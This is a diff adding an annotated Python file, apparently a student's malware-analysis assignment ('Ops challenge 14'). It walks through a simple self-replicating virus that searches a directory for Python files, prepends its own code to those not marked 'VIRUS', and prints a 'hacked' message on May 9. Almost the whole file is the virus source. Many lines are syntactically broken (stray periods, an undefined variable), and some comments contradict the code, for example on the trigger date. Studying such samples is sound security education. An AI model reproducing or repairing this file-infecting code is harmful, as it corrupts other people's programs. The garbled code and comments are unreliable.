@@ -1,0 +1,96 @@
+# Script name:           Ops challenge 14
+# Author:                Kimberly Dills
+# Date of last revision: 9/17/2020
+# Description of purpose:Python Malware Analysis
+
+
+
+#!/usr/bin/python   # using the python interpreter
+
+# the import statements bring os and datetime library to be used in the script
+
+import os  # this import os statements brings os library to be used in the script
+import datetime  # this import datetime brings datetime to be used in the script
+
+SIGNATURE = "VIRUS".  # this signature is assinged a string virus to the variable
+
+# This function sends an output as an array. It inserts files that don't have the word "virus" in the python file and appends it to the array
+def locate(path):  
+
+    files_targeted = []   # creates an empty list, an array    
+    
+    filelist = os.listdir(path)   # lists the directory from the path argument that this function is taking in, and assinging to filelist
+    
+    for fname in filelist:   # runs a for loop to access files and folders in the directory path
+      
+        if os.path.isdir(path+"/"+fname):   # if the specified path is in an existing directory, it will return boolean true otherwise false
+            
+            files_targeted.extend((locatepath+"/"+fname)). # if true comes back from previous logic, the follwoing statement will resurse the locate funtion again and see if there is more folders in this directory
+       
+        elif fname[-3:] == ".py":  # if the files third index from the back is a python file, it will enter into this "if" logic
+        
+            infected = False.   # this sets the "infected" variable as false
+       
+            for line in open(path+"/"+fname):   # this runs a for loop interation to print out line by line
+                
+                if SIGNATURE in line:   # if the line in the python file contains the word "virus", then it will set the variable to true and break out of this for loop
+                    infected = True
+                    break
+                    
+            if infected == False:   # if the previous if logic never hits, then the python file doesn't contain virus so the infected will be set to false, then it will hit this logic and put the file into the files targeted array
+                files_targeted.append(path+"/"+fname)
+   
+    return files_targeted.  # returns the array at the end
+
+# this function is designed to override python files that don't have the virus string and will string the virus file with the current files content
+def infect(files_targeted):   
+    
+    virus = open(os.path.abspath(__file__)).  # this prints "print ablsolute path to the given file"
+    
+    virusstring = ""  # declares a variable called "virusstring" and attack it with an empty string
+   
+    for i,line in enumerate(virus):   # runs the for loop to access the file and output each line in that file
+     
+        if i&gt;=0 and i &lt;39:   # if the "i" is greater than or equal to 0 and "i" is less than 39 then this logic will hit
+           
+            virusstring += line.  # this stores each lines within line 0 to line 39 of string into the "virusstring" variable
+  
+    virus.close.  # this closes the opened file from the memory
+   
+    for fname in files_targeted:   # runs a for loop to access the filename within the files_targeted array
+       
+        f = open(fname).  # declares a variable called "f" and assigned the open file in the files_targeted array to the variable "f"
+       
+        temp = f.read().  # declaring a variable and assigning all of the lines within the file to the variable
+     
+        f.close().  # closeing the "f" file from the memory
+        
+        f = open(fname,"w").  # opens file with writing modifier, and overrides the "fname" file
+
+        f.write(virusstring + temp).  # writes the long texts of string that was previously stored from "virusstring" and link it to the temporary variable that has all the lines from the "f"file
+  
+        f.close().  # closes the file from the memory
+
+# this function to validate current date with may 9th and if its, then print out the fact that user has been hacked.
+def detonate():   
+    
+    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:   # if the current date is May 9th, then execute the following code
+        
+        print "You have been hacked".   # prints to the terminal "you have been hacked"
+
+
+# this variable is storing the list that outputted from the located function call
+files_targeted = locate(os.path.abspath(""))
+
+# this will call the infected funtion with the output array that resulted from the locate function
+infect(files_targeted)
+
+# to start the function and detonate to print out to the user "you have been hacked" on the date, May 5th
+detonate() 
+
+# End
+
+
+
+
+
